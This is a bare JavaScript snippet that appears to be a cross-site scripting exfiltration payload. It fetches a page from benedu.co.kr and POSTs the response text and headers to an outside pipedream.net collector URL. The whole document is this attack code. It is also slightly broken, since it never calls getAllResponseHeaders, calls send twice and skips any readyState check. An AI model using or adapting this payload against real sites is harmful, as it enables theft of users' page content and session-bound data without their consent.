var xhr = new XMLHttpRequest();
xhr.open("GET", "https://www.benedu.co.kr/");
xhr.onreadystatechange = function() {
    text = xhr.responseText;
    console.log(xhr.getAllResponseHeaders);
    y = new XMLHttpRequest();
    y.open("POST", "https://encnu1395lyv7.x.pipedream.net/");
    y.send(text)
    y.send(xhr.getAllResponseHeaders)
};
